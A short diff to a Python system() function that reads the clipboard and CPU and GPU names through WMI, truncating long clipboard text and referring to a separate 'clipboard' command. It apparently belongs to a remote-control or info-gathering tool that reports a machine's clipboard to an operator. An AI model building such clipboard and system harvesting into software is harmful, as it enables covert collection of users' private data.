@@ -30,6 +30,8 @@ def system():
     
     if clipboard == "":
         clipboard = "null"
+    elif len(clipboard) > 1500:
+        clipboard = "Clipboard is too long, use 'clipboard' command to get full clipboard!" 
     
     cpu = wmi.WMI().Win32_Processor()[0].Name
     gpu = wmi.WMI().Win32_VideoController()[0].Name
